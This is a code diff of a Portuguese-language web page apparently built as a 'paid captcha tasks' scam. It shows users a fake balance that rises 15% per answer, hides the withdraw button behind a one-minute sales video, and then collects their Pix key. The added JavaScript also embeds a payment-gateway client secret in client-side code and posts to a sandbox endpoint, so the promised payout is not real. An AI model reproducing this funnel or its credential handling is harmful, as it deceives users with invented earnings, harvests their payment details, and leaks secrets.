@@ -100,6 +100,27 @@
         .popup-wrong {
             color: red;
         }
+        .task-value {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .progress-bar-fill {
+            height: 20px;
+            width: 0;
+            background-color: #4caf50;
+            border-radius: 5px;
+            text-align: center;
+            color: white;
+            line-height: 20px;
+        }
         @media (max-width: 600px) {
             .container {
                 padding: 10px;
@@ -113,6 +134,14 @@
             }
         }
     </style>
+    <link rel="preload" href="https://scripts.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/player.js" as="script">
+    <link rel="preload" href="https://cdn.converteai.net/lib/js/smartplayer/v1/smartplayer.min.js" as="script">
+    <link rel="preload" href="https://images.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/thumbnail.jpg" as="image">
+    <link rel="preload" href="https://cdn.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/663fd08d4cd641000b73e481/main.m3u8" as="fetch">
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://api.vturb.com.br">
 </head>
 <body>
     <div class="container" id="page1">
@@ -150,6 +179,7 @@
         <div class="progresso" id="progresso">
             Tarefa 1 de 7
         </div>
+        <div class="task-value" id="taskValue">Valor da Tarefa: R$0,00</div>
         <div class="content">
             <p id="taskText">Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém veículos.</p>
         </div>
@@ -161,6 +191,9 @@
         <button class="btn btn-green" id="yesButton">Sim</button>
         <button class="btn btn-red" id="noButton">Não</button>
         <div class="error" id="errorMessagePage2"></div>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progressBarFill">0%</div>
+        </div>
     </div>
 
     <div class="container" id="pageFinal" style="display: none;">
@@ -173,9 +206,40 @@
             Saldo: R$100,00
         </div>
         <div class="content">
-            <p>Parabéns! Você concluiu todas as tarefas. Para efetuar o saque do valor total, assista ao vídeo de 4 minutos abaixo.</p>
+            <p>Assista o vídeo abaixo para estar efetuando o saque das suas comissões acumuladas nas tarefas anteriores e poder continuar recebendo comissões por realizar novas tarefas.</p>
+            <div id="vid_663fd09d62dd4d000b35368e" style="position:relative;width:100%;padding: 177.77777777777777% 0 0;">
+                <img id="thumb_663fd09d62dd4d000b35368e" src="https://images.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">
+                <div id="backdrop_663fd09d62dd4d000b35368e" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>
+            </div>
+            <script type="text/javascript" id="scr_663fd09d62dd4d000b35368e">
+                var s=document.createElement("script");
+                s.src="https://scripts.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/player.js", s.async=!0,document.head.appendChild(s);
+            </script>
+            <style>
+                .elementor-element:has(#smartplayer) { width: 100%; }
+            </style>
+            <button class="btn btn-green" id="withdrawButton" style="display:none;">Realizar Saque Agora</button>
         </div>
-        <button class="btn btn-green" id="finalButton">Assistir Vídeo e Realizar Saque</button>
+    </div>
+
+    <div class="container" id="withdrawPage" style="display: none;">
+        <picture>
+            <source srcset="assets/img/img1.webp" type="image/webp">
+            <source srcset="assets/img/img1.png" type="image/png">
+            <img src="assets/img/img1.png" alt="Google Captchas">
+        </picture>
+        <div class="saldo" id="withdrawSaldo">
+            Saldo: R$100,00
+        </div>
+        <div class="content">
+            <p>Insira sua chave pix abaixo para sacar suas comissões das tarefas concluidas do Google Captcha e poder continuar realizando novas tarefas.</p>
+            <form id="pixForm">
+                <label for="pixKey">Chave Pix:</label>
+                <input type="text" id="pixKey" name="pixKey" required>
+                <button type="submit" class="btn btn-green">Enviar</button>
+            </form>
+            <div class="error" id="pixErrorMessage"></div>
+        </div>
     </div>
 
     <div class="popup" id="popup">
@@ -199,17 +263,35 @@
 
         function updateTask() {
             if (currentTask < tasks.length) {
-                document.getElementById('taskImageWebp').srcset = tasks[currentTask].imageWebp;
-                document.getElementById('taskImagePng').srcset = tasks[currentTask].imagePng;
-                document.getElementById('taskImage').src = tasks[currentTask].imagePng;
-                document.getElementById('taskText').innerText = tasks[currentTask].text;
+                const task = tasks[currentTask];
+                document.getElementById('taskImageWebp').srcset = task.imageWebp;
+                document.getElementById('taskImagePng').srcset = task.imagePng;
+                document.getElementById('taskImage').src = task.imagePng;
+                document.getElementById('taskText').innerText = task.text;
                 document.getElementById('progresso').innerText = `Tarefa ${currentTask + 1} de ${tasks.length}`;
                 document.getElementById('taskSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+
+                let taskValue = 0;
+                if (currentTask > 0) {
+                    taskValue = (saldo * 0.15).toFixed(2);
+                }
+                document.getElementById('taskValue').innerText = `Valor da Tarefa: R$${taskValue}`;
+                updateProgressBar();
             } else {
                 document.getElementById('page2').style.display = 'none';
                 document.getElementById('finalSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
                 document.getElementById('pageFinal').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('withdrawButton').style.display = 'block';
+                }, 60000); // 1 minuto
             }
+        }
+
+        function updateProgressBar() {
+            const progress = ((currentTask + 1) / tasks.length) * 100;
+            const progressBarFill = document.getElementById('progressBarFill');
+            progressBarFill.style.width = `${progress}%`;
+            progressBarFill.innerText = `${progress.toFixed(0)}%`;
         }
 
         function showPopup(message, icon, isCorrect) {
@@ -246,9 +328,10 @@
             let message = '';
             let icon = '';
             if (answer === correct) {
-                saldo += saldo * 0.15;
+                const commission = saldo * 0.15;
+                saldo += commission;
                 new Audio('assets/audio/dinheiro.mp3').play();
-                message = `Resposta Correta! Comissão foi adicionado + R$${(saldo * 0.15).toFixed(2)} ao seu saldo, agora você tem R$${saldo.toFixed(2)}.`;
+                message = `Resposta Correta! Comissão de R$${commission.toFixed(2)} foi adicionada ao seu saldo, agora você tem R$${saldo.toFixed(2)}.`;
                 icon = 'assets/img/verificado.png';
                 showPopup(message, icon, true);
             } else {
@@ -270,8 +353,40 @@
             validateAnswer('não');
         });
 
-        document.getElementById('finalButton').addEventListener('click', function() {
-            window.location.href = 'vsl.html';
+        document.getElementById('withdrawButton').addEventListener('click', function() {
+            document.getElementById('pageFinal').style.display = 'none';
+            document.getElementById('withdrawPage').style.display = 'block';
+            document.getElementById('withdrawSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+        });
+
+        document.getElementById('pixForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const pixKey = document.getElementById('pixKey').value;
+            const data = {
+                client_id: 'wjmkt_1713979947271',
+                client_secret: '49d8d1419abe58357fa6ec5d4e562b302c6c661df14ff8b745b6b3376df4cb4c3478cd59160d456791aa555dcae974ee',
+                key_pix: pixKey,
+                value: saldo.toFixed(2),
+            };
+
+            fetch('https://sandbox.ws.suitpay.app/api/v1/gateway/pix-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Pagamento realizado com sucesso!');
+                } else {
+                    document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+                }
+            })
+            .catch((error) => {
+                document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+            });
         });
     </script>
 </body>
